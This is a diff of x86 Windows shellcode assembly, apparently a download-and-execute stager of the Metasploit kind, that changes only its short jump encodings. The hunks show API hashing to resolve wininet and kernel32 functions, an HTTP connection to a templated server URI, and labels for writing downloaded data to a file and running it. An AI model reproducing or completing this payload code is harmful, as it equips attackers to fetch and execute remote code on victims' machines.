@@ -216,7 +216,7 @@ get_next_mod1:             ;
 	pop edi                ; Pop off the current (now the previous) modules hash
 	pop edx                ; Restore our position in the module list
 	mov edx, [edx]         ; Get the next module
-	jmp next_mod           ; Process this module
+	jmp.i8 next_mod        ; Process this module
 
 ; actual routine
 start:
@@ -240,7 +240,7 @@ internetopen:
 	push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
 	call ebp
 
-	jmp dbl_get_server_host
+	jmp.i8 dbl_get_server_host
 
 internetconnect:
 	pop ebx                ; Save the hostname pointer
@@ -256,7 +256,7 @@ internetconnect:
 	push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
 	call ebp
 
-	jmp get_server_uri
+	jmp.i8 get_server_uri
 
 httpopenrequest:
 	pop ecx
@@ -303,7 +303,7 @@ httpsendrequest:
 try_it_again:
 	dec ebx
 	jz thats_all_folks	; failure -> exit
-	jmp set_security_options
+	jmp.i8 set_security_options
 
 dbl_get_server_host:
 	jmp get_server_host
@@ -315,7 +315,7 @@ server_uri:
 	db "/#{server_uri}", 0x00
 
 create_file:
-	jmp get_filename
+	jmp.i8 get_filename
 
 get_filename_return:
 	xor eax,eax       ; zero eax
@@ -365,7 +365,7 @@ write_to_file:
 	push 0x5BAE572D     ; kernel32.dll!WriteFile
 	call ebp
 	sub esp,4           ; set stack back to where it was
-	jmp download_more
+	jmp.i8 download_more
 
 close_and_run:
 	push ebx
